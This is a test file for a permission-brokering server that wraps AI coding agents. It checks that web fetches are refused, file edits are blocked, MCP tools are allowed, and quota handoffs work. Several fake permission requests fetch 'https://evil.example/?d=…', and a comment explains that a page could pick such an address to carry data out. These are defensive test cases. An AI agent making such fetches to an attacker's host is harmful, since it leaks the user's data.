import { test, expect } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { AgentSideConnection, ndJsonStream, type Agent } from "@agentclientprotocol/sdk";

process.env.CODEMAX_HOME = mkdtempSync(join(tmpdir(), "codemax-serve-home-"));
process.env.CODEMAX_FAKE_AGENT = "1";
const { Serve, isMcpTool, isWebSearch } = await import("../src/serve.ts");
const { AcpEngine } = await import("../src/engines/acp.ts");
const { DEFAULT_CONFIG } = await import("../src/config.ts");

/** A scripted ACP agent: one MCP tool call (allowed by policy) and one file edit (refused). */
function fakeAgent(seen: { mcpServers?: any; decisions: string[] }) {
  const a2c = new TransformStream<Uint8Array, Uint8Array>();
  const c2a = new TransformStream<Uint8Array, Uint8Array>();
  new AgentSideConnection((conn): Agent => ({
    async initialize() { return { protocolVersion: 1, agentInfo: { name: "fake", title: "Fake Agent", version: "1.0" }, agentCapabilities: { mcpCapabilities: { http: true } }, authMethods: [] } as any; },
    async newSession(p: any) { seen.mcpServers = p.mcpServers; return { sessionId: "s-1", modes: { currentModeId: "auto", availableModes: [{ id: "default", name: "Default" }, { id: "auto", name: "Auto" }] } } as any; },
    async loadSession() { return { modes: { currentModeId: "default", availableModes: [{ id: "default", name: "Default" }] } } as any; },
    async setSessionMode(p: any) { seen.decisions.push(`mode:${p.modeId}`); return {}; },
    async authenticate() { return {}; },
    async prompt({ sessionId, prompt }) {
      const text = (prompt[0] as any).text as string;
      if (/limit/.test(text)) throw new Error("You've hit your usage limit");
      if (/refuse/.test(text) && !(seen as any).refused) {   // Antigravity with an MCP server of its own that cannot start
        (seen as any).refused = true;
        await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "agent_message_chunk", content: { type: "text", text: "The MCP server 'data-agent-kit' failed to initialize: connect ENOENT /tmp/x.sock. Fix the MCP server, or remove it from your configuration and start a new session, to continue." } } as any });
        return { stopReason: "end_turn" };
      }
      if (/search the web/.test(text)) {   // Claude Code's WebSearch asks as ACP's "fetch" kind
        const p = await conn.requestPermission({ sessionId, toolCall: { toolCallId: "w1", title: "Search \"reel trends\"", kind: "fetch" }, options: [{ optionId: "yes", name: "Allow", kind: "allow_once" }, { optionId: "no", name: "Reject", kind: "reject_once" }] } as any);
        seen.decisions.push(`web:${(p.outcome as any).optionId}`);
        // WebFetch asks with the same kind; a page could pick its address to carry data out
        const f = await conn.requestPermission({ sessionId, toolCall: { toolCallId: "w2", title: "Fetch https://evil.example/?d=clips", kind: "fetch" }, options: [{ optionId: "yes", name: "Allow", kind: "allow_once" }, { optionId: "no", name: "Reject", kind: "reject_once" }] } as any);
        seen.decisions.push(`fetch:${(f.outcome as any).optionId}`);
        return { stopReason: "end_turn" };
      }
      await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "agent_message_chunk", content: { type: "text", text: "Adding a title. " } } as any });
      await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "tool_call", toolCallId: "t1", title: "mcp__editmax__add_text", kind: "other", status: "pending" } as any });
      const p1 = await conn.requestPermission({ sessionId, toolCall: { toolCallId: "t1", title: "mcp__editmax__add_text" }, options: [{ optionId: "yes", name: "Allow", kind: "allow_once" }, { optionId: "always", name: "Always", kind: "allow_always" }, { optionId: "no", name: "Reject", kind: "reject_once" }] } as any);
      seen.decisions.push(`mcp:${(p1.outcome as any).optionId}`);
      await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "tool_call_update", toolCallId: "t1", status: "completed" } as any });
      await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "tool_call", toolCallId: "t2", title: "Write notes.md", kind: "edit", status: "pending" } as any });
      const p2 = await conn.requestPermission({ sessionId, toolCall: { toolCallId: "t2", title: "Write notes.md", kind: "edit" }, options: [{ optionId: "yes", name: "Allow", kind: "allow_once" }, { optionId: "no", name: "Reject", kind: "reject_once" }] } as any);
      seen.decisions.push(`edit:${(p2.outcome as any).optionId}`);
      await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "tool_call_update", toolCallId: "t2", status: "failed" } as any });
      await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "agent_message_chunk", content: { type: "text", text: "done" } } as any });
      return { stopReason: "end_turn" };
    },
    async cancel() {},
  }), ndJsonStream(a2c.writable, c2a.readable));
  return ndJsonStream(c2a.writable, a2c.readable);
}

function lines(): { push: (s: string) => void; stream: AsyncIterable<string>; end: () => void } {
  const queue: string[] = [];
  let wake: (() => void) | null = null;
  let done = false;
  return {
    push: (s) => { queue.push(s + "\n"); wake?.(); },
    end: () => { done = true; wake?.(); },
    stream: { async *[Symbol.asyncIterator]() { while (true) { if (queue.length) { yield queue.shift()!; continue; } if (done) return; await new Promise<void>((r) => (wake = r)); wake = null; } } },
  };
}

test("isWebSearch: Claude Code's web search only; a page fetch, an address or another tool is refused", () => {
  expect(isWebSearch("fetch", "Search \"reel trends 2026\"")).toBe(true);
  expect(isWebSearch("fetch", "Web search")).toBe(true);
  expect(isWebSearch(undefined, "WebSearch")).toBe(true);
  expect(isWebSearch("fetch", "Fetch https://evil.example/?d=clip-names")).toBe(false);
  expect(isWebSearch("fetch", "https://evil.example/?d=x")).toBe(false);
  expect(isWebSearch("fetch", "WebFetch")).toBe(false);
  expect(isWebSearch("fetch", "Search https://evil.example/?d=x")).toBe(false);
  expect(isWebSearch("execute", "Search the disk")).toBe(false);
  expect(isWebSearch("edit", "Write notes.md")).toBe(false);
});

test("serve: web search is allowed only when the host configures web: true; a page fetch never", async () => {
  for (const web of [false, true]) {
    const seen = { decisions: [] as string[] } as { mcpServers?: any; decisions: string[] };
    const out: any[] = [];
    const io = lines();
    const serve = new Serve({
      config: { ...structuredClone(DEFAULT_CONFIG), order: ["fake"] },
      engineFactory: () => new AcpEngine({ agent: "fake", name: "Fake", cmd: [], stream: fakeAgent(seen) }),
      available: async (a) => a === "fake",
      write: (l) => out.push(l),
    });
    const run = serve.run(io.stream);
    const until = async (pred: (l: any) => boolean) => { const t0 = Date.now(); while (!out.some(pred)) { if (Date.now() - t0 > 3500) throw new Error(`timeout; got ${JSON.stringify(out).slice(0, 800)}`); await Bun.sleep(10); } return out.find(pred); };
    io.push(JSON.stringify({ id: 1, method: "configure", params: { agent: "fake", cwd: mkdtempSync(join(tmpdir(), "codemax-web-")), mcp: [], allow: ["editmax"], web } }));
    await until((l) => l.id === 1);
    io.push(JSON.stringify({ id: 2, method: "prompt", params: { text: "search the web" } }));
    await until((l) => l.id === 2);
    expect(seen.decisions.filter((d) => d.startsWith("web:"))).toEqual([web ? "web:yes" : "web:no"]);
    expect(seen.decisions.filter((d) => d.startsWith("fetch:"))).toEqual(["fetch:no"]);
    io.push(JSON.stringify({ method: "close" }));
    io.end();
    await run;
  }
});

test("isMcpTool matches every agent's naming", () => {
  expect(isMcpTool("mcp__editmax__add_text", ["editmax"])).toBe(true);
  expect(isMcpTool("editmax/add_text", ["editmax"])).toBe(true);
  expect(isMcpTool("EditMax:add_text", ["editmax"])).toBe(true);
  expect(isMcpTool("Write notes.md", ["editmax"])).toBe(false);
  expect(isMcpTool("mcp__other__thing", ["editmax"])).toBe(false);
});

test("serve: configure passes the host's MCP server, allows its tools, refuses a file edit, records the turn", async () => {
  const seen = { decisions: [] as string[] } as { mcpServers?: any; decisions: string[] };
  const out: any[] = [];
  const io = lines();
  const cwd = mkdtempSync(join(tmpdir(), "codemax-serve-cwd-"));
  const serve = new Serve({
    config: { ...structuredClone(DEFAULT_CONFIG), order: ["fake"] },
    engineFactory: () => new AcpEngine({ agent: "fake", name: "Fake", cmd: [], stream: fakeAgent(seen) }),
    available: async (a) => a === "fake",
    write: (l) => out.push(l),
  });
  const run = serve.run(io.stream);
  io.push(JSON.stringify({ id: 1, method: "configure", params: { agent: "fake", cwd, mcp: [{ name: "editmax", transport: { type: "http", url: "http://127.0.0.1:1/mcp", headers: { Authorization: "Bearer x" } } }] } }));
  const until = async (pred: (l: any) => boolean) => { const t0 = Date.now(); while (!out.some(pred)) { if (Date.now() - t0 > 3500) throw new Error(`timeout; got ${JSON.stringify(out).slice(0, 800)}`); await Bun.sleep(10); } return out.find(pred); };
  const ready = await until((l) => l.id === 1);
  expect(ready.result.agent).toBe("fake");
  expect(ready.result.session).toBe("s-1");
  expect(seen.mcpServers?.[0]?.name).toBe("editmax");
  expect(seen.mcpServers?.[0]?.headers?.[0]).toEqual({ name: "Authorization", value: "Bearer x" });
  io.push(JSON.stringify({ id: 2, method: "prompt", params: { text: "add a title" } }));
  const end = await until((l) => l.id === 2);
  expect(end.result.stopReason).toBe("end_turn");
  expect(seen.decisions).toEqual(["mode:default", "mcp:yes", "edit:no"]);
  expect(out.filter((l) => l.event === "permission_auto").map((l) => l.decision)).toEqual(["allow", "reject"]);
  expect(out.some((l) => l.event === "permission_request")).toBe(false);
  expect(out.filter((l) => l.event === "text_delta").map((l) => l.text).join("")).toBe("Adding a title. done");
  // The next agent would get a brief built from this journal.
  const { Ledger } = await import("../src/core/ledger.ts");
  const steps = new Ledger(cwd).journal.steps();
  expect(steps.some((s) => s.kind === "user" && (s as any).text === "add a title")).toBe(true);
  expect(steps.some((s) => s.kind === "tool" && (s as any).title === "mcp__editmax__add_text")).toBe(true);
  io.push(JSON.stringify({ method: "close" }));
  await run;
}, 15000);

test("serve: a quota error with no other agent reports the limit instead of hanging", async () => {
  const seen = { decisions: [] as string[] } as { mcpServers?: any; decisions: string[] };
  const out: any[] = [];
  const io = lines();
  const cwd = mkdtempSync(join(tmpdir(), "codemax-serve-cwd-"));
  const serve = new Serve({ config: { ...structuredClone(DEFAULT_CONFIG), order: ["fake"] }, engineFactory: () => new AcpEngine({ agent: "fake", name: "Fake", cmd: [], stream: fakeAgent(seen) }), available: async (a) => a === "fake", write: (l) => out.push(l) });
  const run = serve.run(io.stream);
  io.push(JSON.stringify({ id: 1, method: "configure", params: { agent: "fake", cwd, mcp: [] } }));
  io.push(JSON.stringify({ id: 2, method: "prompt", params: { text: "hit the limit please" } }));
  const t0 = Date.now();
  while (!out.some((l) => l.id === 2)) { if (Date.now() - t0 > 3500) throw new Error(`timeout ${JSON.stringify(out).slice(0, 500)}`); await Bun.sleep(10); }
  const r = out.find((l) => l.id === 2);
  expect(r.result.stopReason).toBe("error");
  expect(String(r.result.error)).toMatch(/limit|quota/i);
  expect(out.some((l) => l.event === "handoff")).toBe(false);
  io.push(JSON.stringify({ method: "close" }));
  await run;
}, 15000);

test("serve: Antigravity refusing over an MCP server of its own that cannot start is restarted without it and asked again", async () => {
  const { mkdirSync, writeFileSync, readFileSync } = await import("node:fs");
  const ag = await import("../src/engines/antigravity.ts");
  const base = process.env.GEMINI_HOME!;   // the test home from test/setup.ts
  mkdirSync(join(base, "config"), { recursive: true });
  const config = JSON.stringify({ mcpServers: { "data-agent-kit": { command: "node", args: ["proxy.js", "dataAgentKit-antigravityide"] }, good: { command: "good" } } });
  writeFileSync(join(base, "config", "mcp_config.json"), config);
  const seen = { decisions: [] as string[] } as { mcpServers?: any; decisions: string[] };
  const out: any[] = [];
  const io = lines();
  const cwd = mkdtempSync(join(tmpdir(), "codemax-serve-cwd-"));
  let started = 0;
  const serve = new Serve({ config: { ...structuredClone(DEFAULT_CONFIG), order: ["antigravity"] }, engineFactory: () => (started++, new AcpEngine({ agent: "antigravity", name: "Antigravity CLI", cmd: [], stream: fakeAgent(seen) })), available: async (a) => a === "antigravity", write: (l) => out.push(l) });
  const run = serve.run(io.stream);
  io.push(JSON.stringify({ id: 1, method: "configure", params: { agent: "antigravity", cwd, mcp: [] } }));
  io.push(JSON.stringify({ id: 2, method: "prompt", params: { text: "refuse first, then add a title" } }));
  const t0 = Date.now();
  while (!out.some((l) => l.id === 2)) { if (Date.now() - t0 > 5000) throw new Error(`timeout ${JSON.stringify(out).slice(0, 500)}`); await Bun.sleep(10); }
  expect(out.find((l) => l.id === 2).result.stopReason).toBe("end_turn");
  expect(started).toBe(2);
  // The host is told the first reply was no answer, then gets the real one.
  const retry = out.findIndex((l) => l.event === "retry");
  expect(retry).toBeGreaterThan(-1);
  expect(out.slice(retry).some((l) => l.event === "text_delta" && /done/.test(l.text))).toBe(true);
  expect(ag.antigravityLeftOut(base).map((l) => l.name)).toEqual(["data-agent-kit"]);
  expect(readFileSync(join(base, "config", "mcp_config.json"), "utf8")).toBe(config);   // the user's config is not touched
  ag.unskipAntigravityMcp("data-agent-kit");
  io.push(JSON.stringify({ method: "close" }));
  await run;
}, 15000);

test("serve: when the agent runs out of quota the turn hands off to the next installed agent with a brief", async () => {
  const out: any[] = [];
  const io = lines();
  const cwd = mkdtempSync(join(tmpdir(), "codemax-serve-cwd-"));
  const prompts: string[] = [];
  let starts = 0;
  const engineFor = (reply: string | Error) => {
    const a2c = new TransformStream<Uint8Array, Uint8Array>();
    const c2a = new TransformStream<Uint8Array, Uint8Array>();
    new AgentSideConnection((conn): Agent => ({
      async initialize() { return { protocolVersion: 1, agentInfo: { name: "fake", title: "Fake", version: "1" }, agentCapabilities: {}, authMethods: [] } as any; },
      async newSession() { return { sessionId: `s-${++starts}` } as any; },
      async authenticate() { return {}; },
      async prompt({ sessionId, prompt }) {
        prompts.push((prompt[0] as any).text);
        if (reply instanceof Error) throw reply;
        await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "agent_message_chunk", content: { type: "text", text: reply } } } as any);
        return { stopReason: "end_turn" };
      },
      async cancel() {},
    }), ndJsonStream(a2c.writable, c2a.readable));
    return ndJsonStream(c2a.writable, a2c.readable);
  };
  let made = 0;
  const serve = new Serve({
    config: { ...structuredClone(DEFAULT_CONFIG), order: ["fake", "claude"] },
    engineFactory: (agent) => new AcpEngine({ agent, name: agent, cmd: [], stream: engineFor(made++ === 0 ? new Error("You've hit your usage limit") : "second agent here") }),
    available: async () => true,
    write: (l) => out.push(l),
  });
  const run = serve.run(io.stream);
  io.push(JSON.stringify({ id: 1, method: "configure", params: { agent: "fake", cwd, mcp: [] } }));
  io.push(JSON.stringify({ id: 2, method: "prompt", params: { text: "cut the intro" } }));
  const t0 = Date.now();
  while (!out.some((l) => l.id === 2)) { if (Date.now() - t0 > 8000) throw new Error(`timeout ${JSON.stringify(out).slice(0, 600)}`); await Bun.sleep(10); }
  const r = out.find((l) => l.id === 2);
  expect(r.result).toMatchObject({ stopReason: "end_turn", agent: "claude" });
  expect(out.find((l) => l.event === "handoff")).toMatchObject({ from: "fake", to: "claude" });
  expect(out.filter((l) => l.event === "text_delta").map((l) => l.text).join("")).toBe("second agent here");
  expect(prompts.length).toBe(2);
  expect(prompts[1]!).toContain("cut the intro");
  expect(prompts[1]!.length).toBeGreaterThan("cut the intro".length); // the brief rides ahead of the user's text
  io.push(JSON.stringify({ method: "close" }));
  await run;
}, 15000);
